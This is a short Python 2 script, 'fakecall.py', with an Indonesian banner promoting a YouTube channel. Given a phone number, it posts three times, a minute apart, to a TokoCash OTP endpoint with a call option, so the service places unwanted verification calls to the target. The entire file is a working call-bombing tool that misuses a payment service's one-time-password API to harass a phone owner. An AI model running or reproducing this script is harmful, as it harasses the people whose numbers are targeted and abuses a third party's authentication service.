
import sys
import time
import requests

__banner__ = """
\033[1;33m   ____     __         _____     ____ \033[1;37m
\033[1;33m  / __/__ _/ /_____   / ___/__ _/ / / \033[1;37m
\033[1;33m / _// _ `/  '_/ -_) / /__/ _ `/ / /  \033[1;37m
\033[1;33m/_/  \\_,_/_/\\_\\\\__/  \\___/\\_,_/_/_/   \033[1;37m
Jangan lupa like, share dan subscribe ya KOJAWATV
"""

def spam():
	options=sys.argv[1]
	phone=sys.argv[2]
	if sys.argv[1] == "-c":
		print __banner__
		param = {'msisdn':''+sys.argv[2],'accept':'call'}
		count = 0
		while (count < 3):
			r = requests.post('https://www.tokocash.com/oauth/otp', data=param)
			if "otp_attempt_left" in r.text:
				print("\033[1;32m[  OK  ] Sukses Dikirim... Tunggu 60 Detik...\033[0m")
			else:
				print("\033[1;31m[FAILED] Gagal Dikirim :(... Tunggu 60 Detik...\033[0m")
			time.sleep(60)
			count = count + 1
		print("\033[1;36m[ DONE ] Exiting...")
		sys.exit(1)
	else:
		print __banner__
		print "Usage: fakecall.py -c PHONE"
		print "fakecall.py: error: %s option requires an argument" %options
		sys.exit()

if __name__ == '__main__':
	if len(sys.argv) != 3:
		print __banner__
		print "Usage: fakecall.py -c PHONE"
		sys.exit(0)
	else:
		spam()
